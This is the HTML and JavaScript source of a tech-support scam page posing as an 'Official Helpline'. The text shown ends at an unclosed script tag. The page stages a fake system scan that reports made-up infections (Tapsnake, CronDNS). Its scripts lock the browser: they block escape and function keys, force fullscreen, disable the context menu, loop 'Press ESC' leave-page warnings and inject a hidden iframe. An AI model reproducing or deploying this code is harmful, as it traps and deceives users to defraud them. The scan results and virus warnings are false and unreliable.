
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex,nofollow">

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-174999163-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-174999163-1');
  
      var openPage = true;
function popup() {

}
  
</script>


    <meta name="google" value="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Official-Helpline771</title>
  <link href="./images/favicon.ico" rel="shortcut icon">

  <!-- Latest compiled and minified CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
        integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

  <!-- Optional theme -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css"
        integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

  <!--<link rel="stylesheet" href="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.css">-->
  <link rel="stylesheet" type="text/css" href="css/style.css">



  <script>
          function getURLParameter(name) {
              return decodeURI(
                  (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
              );
          }
  </script>

  <script>
      gourl = "index.php"
  	opener.location = gourl;
  </script>

  <script type="text/javascript">
  		onbeforeunload=function()
  		{
  			alert ("Press ESC, to close this page!");
  			return "Press ESC, to close this page!";

  		}
  	</script>

  <script src="jquery-3.js"></script>

  <script type="text/javascript">
  function move() {
     $("#amt").trigger( "click" );
  }

  function pop(url,w,h) {
      var n = window.open(url,'_blank','width='+w+',height='+h);
      if(n==null) {
          return true;
      }
      return false;
  }



  </script>



  <script type="text/javascript">
  $(document).ready(function()
  {
      window.scrollTo(0, 1);
      values = [
          {"percent" : "0", "text" : "Loading..."},
          {"percent" : "11", "text" : "Scanning... <strong>Folders</strong>"},
          {"percent" : "35", "text" : "Scanning... <strong>Documents</strong>"},
          {"percent" : "63", "text" : "Scanning... <strong>System Files</strong>"},
          {"percent" : "81", "text" : "Scanning... <strong>Registry</strong>"},
          {"percent" : "100", "text" : "<strong>Scan Complete</strong>"}
      ];

      var i = 0;
      var intId = null;

      function updateStatusBar() {
          if (i < values.length-1) {
              i++;
              $(".progress-bar-color").css({width: parseInt(values[i].percent)+'%'});
              $('.status-percent').html(values[i].percent + '%');
              $('.status-text').html(values[i].text);
          } else {
              clearInterval(intId);
              $('.status-percent').css('visibility', 'hidden');



  			$('.status-text').html('<strong>Virus Found: Tapsnake; CronDNS; Dubfishicv</strong>').addClass('align').fadeOut(500).fadeIn(500).fadeOut(500).fadeIn(500).fadeOut(500, function() {
                  $('.status-text').html('<strong>Searching for removal options...</strong>').addClass('searching');
                  $('.status-text').fadeIn(500, function () {
                      window.setTimeout(function() {
                          $('.outer1').fadeOut(500, function() {
                              $('.outer1').remove();
                              $('.outer2').fadeIn(500);
                          });
                      }, 5000);
                  });
  			});

              $('.progress-bar').addClass('progress-bar-red');
          }
      }

      $('.orange').click(function () {
          $.when($('.outer0').fadeOut(500)).done(function () {
              $('.outer0').remove();
              $('.outer1').show();
              intId = setInterval(updateStatusBar,2000);
          });
      });
  });

  </script>

  <script type="text/javascript">
       function PopIt() { return "Warning! A Full System Scan is Required."; }
       function UnPopIt()  { /* nothing to return */ }

       $(document).ready(function() {
        window.onbeforeunload = PopIt;
      $("a").click(function(){ window.onbeforeunload = UnPopIt; });
       });
  </script>


  <script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
  <style>

  /* The Modal (background) */
  .modal {
  	display: none; /* Hidden by default */
  	position: fixed; /* Stay in place */
  	z-index: 1; /* Sit on top */
  	padding-top: 130px; /* Location of the box */
  	left: 0;
  	top: 0;
  	width: 100%; /* Full width */
  	height: 100%; /* Full height */
  	overflow: auto; /* Enable scroll if needed */
  	background-color: rgb(0,0,0); /* Fallback color */
  	background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
  }

  /* Modal Content */
  .modal-content {
  	position: relative;
  	background-color: red;
  	margin: auto;
  	padding: 0;
  	/*border: 1px solid #888;*/
  	width: 80%;
  	box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);
  	-webkit-animation-name: animatetop;
  	-webkit-animation-duration: 0.4s;
  	animation-name: animatetop;
  	animation-duration: 0.4s
  }

  /* Add Animation */
  @-webkit-keyframes animatetop {
  	from {top:-300px; opacity:0}
  	to {top:0; opacity:1}
  }

  @keyframes animatetop {
  	from {top:-300px; opacity:0}
  	to {top:0; opacity:1}
  }

  /* The Close Button */
  .close {
  display:none;
  	color: white;
  	float: right;
  	font-size: 28px;
  	font-weight: bold;
  }

  .close:hover,
  .close:focus {
  	color: #000;
  	text-decoration: none;
  	cursor: pointer;
  }

  .modal-header {
  	padding: 2px 20px;
  	background-color: red;
  	color: white;

  }
  .modal-header h2
  {
  border:none;
  font-size:42px;
  color: white;
  }

  .modal-body {padding: 2px 20px;color:white;}

  .modal-footer {
  	padding: 2px 10px;
  	background-color: red;
  	color: white;
  	height:80px;

  }

  .modal-footer btn{
  background-color:orange;
  }



  .blink {
  background-color:yellow;
  color:black;
  animation: blink-animation 1s steps(5, start) infinite;
  -webkit-animation: blink-animation 1s steps(5, start) infinite;
  }
  @keyframes blink-animation {
  to {
  visibility: hidden;
  }
  }
  @-webkit-keyframes blink-animation {
  to {
  visibility: hidden;
  }
  }







  </style>


    <style>div.fixed{position:fixed;bottom:0;right:-220px; width: 550px;border:1px }</style>
    <style>div.fixed2{position:fixed;bottom:0px;right:25px;width:200px;height:50px;border:1px;color:black;font-size:22px;font-weight:bold;-webkit-animation-name:example;-webkit-animation-duration:1s;animation-name:example;animation-duration:1s;animation-iteration-count:infinite}@-webkit-keyframes example{0%{color:black}50%{color:red}100%{color:black}}@keyframes example{0%{color:black}50%{color:red}100%{color:black}}</style>




  <style type="text/css">
      .nocursor { cursor:none; }
  </style>

</head>

<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>

<script type="text/javascript">
		window.onkeydown = function(evt)
		{
			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
			{
				return false;

			}

		};
		window.onkeypress = function(evn)
		{
			if(evn.keyCode == 123 || evn.keyCode == 117) return false;

		};
	</script>

<script type="text/javascript">
		var stroka = "<tr><td align='right' background='data:image/jpeg;base64,/9j/4QPbRXhpZgAASUkqAAgAAAAMAAABAwABAAAAAQAAAAEBAwABAAAAPQAAAAIBAwADAAAAngAAAAYBAwABAAAAAgAAABIBAwABAAAAAQAAABUBAwABAAAAAwAAABoBBQABAAAApAAAABsBBQABAAAArAAAACgBAwABAAAAAgAAADEBAgAiAAAAtAAAADIBAgAUAAAA1gAAAGmHBAABAAAA7AAAACQBAAAIAAgACACA/AoAECcAAID8CgAQJwAAQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpADIwMTY6MDY6MjAgMjA6MzQ6MDkAAAAEAACQBwAEAAAAMDIyMQGgAwABAAAA//8AAAKgBAABAAAAAQAAAAOgBAABAAAAPQAAAAAAAAAAAAYAAwEDAAEAAAAGAAAAGgEFAAEAAAByAQAAGwEFAAEAAAB6AQAAKAEDAAEAAAACAAAAAQIEAAEAAACCAQAAAgIEAAEAAABRAgAAAAAAAEgAAAABAAAASAAAAAEAAAD/2P/tAAxBZG9iZV9DTQAC/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAENCwsNDg0QDg4QFA4ODhQUDg4ODhQRDAwMDAwREQwMDAwMDBEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8AAEQgAPQABAwEiAAIRAQMRAf/dAAQAAf/EAT8AAAEFAQEBAQEBAAAAAAAAAAMAAQIEBQYHCAkKCwEAAQUBAQEBAQEAAAAAAAAAAQACAwQFBgcICQoLEAABBAEDAgQCBQcGCAUDDDMBAAIRAwQhEjEFQVFhEyJxgTIGFJGhsUIjJBVSwWIzNHKC0UMHJZJT8OHxY3M1FqKygyZEk1RkRcKjdDYX0lXiZfKzhMPTdePzRieUpIW0lcTU5PSltcXV5fVWZnaGlqa2xtbm9jdHV2d3h5ent8fX5/cRAAICAQIEBAMEBQYHBwYFNQEAAhEDITESBEFRYXEiEwUygZEUobFCI8FS0fAzJGLhcoKSQ1MVY3M08SUGFqKygwcmNcLSRJNUoxdkRVU2dGXi8rOEw9N14/NGlKSFtJXE1OT0pbXF1eX1VmZ2hpamtsbW5vYnN0dXZ3eHl6e3x//aAAwDAQACEQMRAD8A9SSSSSU//9D1D1K/3h94SVT0Kv8Ayu/6NP8A6VSSU//R9VSSSSU//9L1D7Tjf6Vn+cElQ3Z3+jb/AJ7v/SSSSn//2f/tC8BQaG90b3Nob3AgMy4wADhCSU0EBAAAAAAADxwBWgADGyVHHAIAAAKmYQA4QklNBCUAAAAAABDXSKRdjvG25hCtMjyw34aEOEJJTQQ6AAAAAAD3AAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAABAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAABUEHwQwBEAEMAQ8BDUEQgRABEsAIARGBDIENQRCBD4EPwRABD4EMQRLAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAACXByb29mQ01ZSwA4QklNBDsAAAAAAi0AAAAQAAAAAQAAAAAAEnByaW50T3V0cHV0T3B0aW9ucwAAABcAAAAAQ3B0bmJvb2wAAAAAAENsYnJib29sAAAAAABSZ3NNYm9vbAAAAAAAQ3JuQ2Jvb2wAAAAAAENudENib29sAAAAAABMYmxzYm9vbAAAAAAATmd0dmJvb2wAAAAAAEVtbERib29sAAAAAABJbnRyYm9vbAAAAAAAQmNrZ09iamMAAAABAAAAAAAAUkdCQwAAAAMAAAAAUmQgIGRvdWJAb+AAAAAAAAAAAABHcm4gZG91YkBv4AAAAAAAAAAAAEJsICBkb3ViQG/gAAAAAAAAAAAAQnJkVFVudEYjUmx0AAAAAAAAAAAAAAAAQmxkIFVudEYjUmx0AAAAAAAAAAAAAAAAUnNsdFVudEYjUHhsQFIAAAAAAAAAAAAKdmVjdG9yRGF0YWJvb2wBAAAAAFBnUHNlbnVtAAAAAFBnUHMAAAAAUGdQQwAAAABMZWZ0VW50RiNSbHQAAAAAAAAAAAAAAABUb3AgVW50RiNSbHQAAAAAAAAAAAAAAABTY2wgVW50RiNQcmNAWQAAAAAAAAAAABBjcm9wV2hlblByaW50aW5nYm9vbAAAAAAOY3JvcFJlY3RCb3R0b21sb25nAAAAAAAAAAxjcm9wUmVjdExlZnRsb25nAAAAAAAAAA1jcm9wUmVjdFJpZ2h0bG9uZwAAAAAAAAALY3JvcFJlY3RUb3Bsb25nAAAAAAA4QklNA+0AAAAAABAASAAAAAEAAgBIAAAAAQACOEJJTQQmAAAAAAAOAAAAAAAAAAAAAD+AAAA4QklNBA0AAAAAAAQAAAAeOEJJTQQZAAAAAAAEAAAAHjhCSU0D8wAAAAAACQAAAAAAAAAAAQA4QklNJxAAAAAAAAoAAQAAAAAAAAACOEJJTQP1AAAAAABIAC9mZgABAGxmZgAGAAAAAAABAC9mZgABAKGZmgAGAAAAAAABADIAAAABAFoAAAAGAAAAAAABADUAAAABAC0AAAAGAAAAAAABOEJJTQP4AAAAAABwAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAADhCSU0EAAAAAAAAAgADOEJJTQQCAAAAAAAIAAAAAAAAAAA4QklNBDAAAAAAAAQBAQEBOEJJTQQtAAAAAAAGAAEAAAAEOEJJTQQIAAAAAAAQAAAAAQAAAkAAAAJAAAAAADhCSU0EHgAAAAAABAAAAAA4QklNBBoAAAAAAz0AAAAGAAAAAAAAAAAAAAA9AAAAAQAAAAQAMgBRAD0APQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAQAAAD0AAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAQAAAAAAAG51bGwAAAACAAAABmJvdW5kc09iamMAAAABAAAAAAAAUmN0MQAAAAQAAAAAVG9wIGxvbmcAAAAAAAAAAExlZnRsb25nAAAAAAAAAABCdG9tbG9uZwAAAD0AAAAAUmdodGxvbmcAAAABAAAABnNsaWNlc1ZsTHMAAAABT2JqYwAAAAEAAAAAAAVzbGljZQAAABIAAAAHc2xpY2VJRGxvbmcAAAAAAAAAB2dyb3VwSURsb25nAAAAAAAAAAZvcmlnaW5lbnVtAAAADEVTbGljZU9yaWdpbgAAAA1hdXRvR2Vu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bnQjIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDE2LTA2LTIwVDIwOjE5OjA2KzAzOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxNi0wNi0yMFQyMDozNDowOSswMzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxNi0wNi0yMFQyMDozNDowOSswMzowMCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowN2YyNTE1NC1jNmUzLTUyNDAtYTMzMy02MWQwNTJhYWFjMjgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QkJDNjMwNjcyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDpCQkM2MzA2NzJDRDkxMUU2QjUzQURGMTk1MDA1NEUwQyIgZGM6Zm9ybWF0PSJpbWFnZS9qcGVnIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkJDNjMwNjQyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkJDNjMwNjUyQ0Q5MTFFNkI1M0FERjE5NTAwNTRFMEMiLz4gPHhtcE1NOkhpc3Rvcnk+IDxyZGY6U2VxPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MDdmMjUxNTQtYzZlMy01MjQwLWEzMzMtNjFkMDUyYWFhYzI4IiBzdEV2dDp3aGVuPSIyMDE2LTA2LTIwVDIwOjM0OjA5KzAzOjAwIiBzdEV2dDpzb2Z0d2FyZUFnZW50PSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoV2luZG93cykiIHN0RXZ0OmNoYW5nZWQ9Ii8iLz4gPC9yZGY6U2VxPiA8L3htcE1NOkhpc3Rvcnk+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/eHBhY2tldCBlbmQ9InciPz7/7gAhQWRvYmUAZIAAAAABAwAQAwIDBgAAAAAAAAAAAAAAAP/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAENCwsNDg0QDg4QFA4ODhQUDg4ODhQRDAwMDAwREQwMDAwMDBEMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8IAEQgAPQABAwEiAAIRAQMRAf/EAHMAAQACAwAAAAAAAAAAAAAAAAACBAMFBwEBAAAAAAAAAAAAAAAAAAAAABAAAQUBAQAAAAAAAAAAAAAAABAgAxMEEhQRAAAFBAMAAAAAAAAAAAAAAAAQAQKSkTIz06IDNRIBAAAAAAAAAAAAAAAAAAAAIP/aAAwDAQECEQMRAAAA6kCKoNgDEoD/2gAIAQIAAQUAZ//aAAgBAwABBQBn/9oACAEBAAEFAEsjKIl9OY63H//aAAgBAgIGPwAf/9oACAEDAgY/AB//2gAIAQEBBj8AK5KoPO49O08rJIMbZu1D/9k='></td></tr>";
	</script>
<script type="text/javascript">
		function toggleFullScreen()
		{
			if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
			{
				if (document.documentElement.requestFullscreen)
				{
					document.documentElement.requestFullscreen();

				}
				else if (document.documentElement.mozRequestFullScreen)
				{
					document.documentElement.mozRequestFullScreen();

				}
				else if (document.documentElement.webkitRequestFullscreen)
				{
					document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
				}
			}
		}
	</script>
<script type="text/javascript">
		window.onblur = function()
		{

		}

	</script>
<script type="text/javascript">
		document.addEventListener('keyup', function(es)
				{
					if (es.keyCode == 27)
					{
						toggleFullScreen();

					}
				}
				, false);
	</script>
<script type="text/javascript">
		document.addEventListener('keyup', function(e)
				{
					if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
					{
						document.getElementById('map').innerHTML = stroka;
						toggleFullScreen();

					}
				}
				, false);
	</script>
<script type="text/javascript">
		window.onload = function ()
		{
			document.onclick = function (e)
			{
				e = e || event;
				target = e.target || e.srcElement;
				if (target.tagName == "DIV")
				{
					toggleFullScreen();
					document.body.style.cursor = 'not-allowed';
					document.getElementById('map').innerHTML = stroka;
					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;
					left: -25px;
					'></iframe>";

				}
				else
				{
					toggleFullScreen();
					document.body.style.cursor = 'not-allowed/index.htm';
					document.getElementById('map').innerHTML = stroka;
					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;
					left: -25px;
					'></iframe>";

				}

			}
		}
	</script>
<script type="text/javascript">
		document.oncontextmenu=new Function("return false");
	</script>
<script type="text/javascript">
		addEventListener("click", function() {
			document.getElementById('map').innerHTML = stroka;
			var
					el = document.documentElement
					, rfs =
							el.requestFullScreen
							|| el.webkitRequestFullScreen
							|| el.mozRequestFullScreen
					;

			rfs.call(el);

		});



	</script>

<script type="text/javascript">
		window.onkeydown = function(evt)
		{
			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 91)
			{
				return togglefullscreen();

			}

		};
		window.onkeypress = function(evn)
		{
			if(evn.keyCode == 123 || evn.keyCode == 117 || evn.keyCode == 91) return false;

		};




	</script>

<script type="text/javascript">
		onbeforeunload=function()
		{
			alert ("Press ESC, to close this page!");
			return "Press ESC, to close this page!";

		}
	</script>
    <script type="text/javascript">
var idleTime = 0;
$(document).ready(function () {
    //Increment the idle time counter every minute.
    var idleInterval = setInterval(timerIncrement, 60000); // 1 minute

    //Zero the idle timer on mouse movement.
    $(this).mousemove(function (e) {
        idleTime = 0;
    });
    $(this).keypress(function (e) {
        idleTime = 0;
    });
});

function timerIncrement() {
    idleTime = idleTime + 1;
    if (idleTime > 19) { // 20 minutes
        window.location.reload();
    }
}
</script>

<script>
function getURLParameter(name) {
return decodeURI(
(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
);
}
</script>


<script type="text/javascript">
